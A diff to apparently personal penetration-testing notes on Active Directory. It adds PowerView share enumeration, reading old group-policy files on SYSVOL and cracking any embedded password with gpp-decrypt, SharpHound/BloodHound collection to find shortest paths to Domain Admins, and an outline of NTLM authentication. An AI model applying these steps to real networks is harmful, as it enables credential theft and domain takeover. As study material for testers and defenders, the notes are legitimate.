@@ -290,7 +290,7 @@ Foreach($user_obj in $user_result)
 You can also just use the https://github.com/LancreFI/offensive/blob/main/enumhelper.ps1 helper script for enumeration.
 Or if you want more, go for https://github.com/PowerShellMafia/PowerSploit/
 
-----
+--
 
 ##Using PowerView from the above mentioned PowerSploit
 
@@ -317,7 +317,7 @@ Get-NetSession -ComputerName targethost -Verbose
 #Enumerate SPNs
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
-----
+--
 
 ##Enumerating service accounts
 
@@ -359,3 +359,57 @@ net group "Group Leaders" username /add /domain
 Get-NetGroup "Group Leaders" | select member
 #Without
 Get-ADGroupMember "Group Leaders" | select username
+
+--
+
+#Finding domain shares with PowerView
+#List all:
+Find-DomainShare
+#List the ones available to our user
+Find-DomainShare -CheckShareAccess
+
+#Listing with ls
+ls \\FILESERV.domain.tld\sharefolder
+
+#If you happen to find for example some old policy under sysvol:
+cat \\dc1.domain.tld\sysvol\domain.tld\Policies\olds\backup_policy.xml
+#If the old group policy (GPP) would happen to contain a password, it can be cracked with 
+#gpp-decrypt (https://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html) as the private key has been posted in public
+
+--
+
+##Doing the enumeration automatically with for example SharpHound + BloodHound https://github.com/BloodHoundAD/BloodHound/tree/master
+
+#SharpHound to collect data (note that this causes a lot of noise, so would be a miracle not to get caught somewhere):
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\users\username\desktop\ -OutputPrefix "ad_dump"
+
+#Import the AD data to your offensive host from the target host, should be located on the user's desktop named something along the lines of:
+#ad_dump_YYYYMMDDHHmmSS.zip
+#To import, you first need to start Neo4J (included with BloodHound when installed with APT in Kali at least) sudo systemctl start neo4j
+#After Neo4J is booted up follow the link provided by the startup process to access the local web instance and login (default creds: neo4j/neo4j)
+#Next we can start bloodhound
+bloodhound
+#Bloodhound should detect your Neo service address and prompt you for the credentials and then you get to importing the zip
+
+#Keep refreshing database stats until it looks like all is populated (might take a while if a big AD environ)
+#Under analysis we can find interesting stuff, out of which some worth checking at least are
+# -Find All Domain Admins (under Domain Information)
+# -Find Shortest Paths to Domain Admins
+# -Find Shortest Paths to Domain Admins from Owned Principals, which you can use after marking "owned" nodes. Nevermind if you don't actually have any,
+#  this can still be used to plan some possible routes to further pwning if there are some likely targets you're going to own.
+
+--
+
+##Notes and info on AD auth types:
+
+#NTLM
+#Still used by some 3rd party providers and as a fallback, so not completely legacy yet. Also used when authenticatin to IP, instead of hostname or to
+#a hostname not registered on the AD integrated DNS.
+# 1: Client calculates NTLM hash from the username
+# 2: Client sends username to server
+# 3: Server responds with nonce (==challenge, random)
+# 4: Client replies with an NTLM hash encrypted nonce
+# 5: Server sends response, nonce and username to DC
+# 6: DC encrypts nonce with NTLM hash and checks it against the received response (DC has all user hashes)
+# 7: If response and encrypted nonce match, authentication approval is sent to server
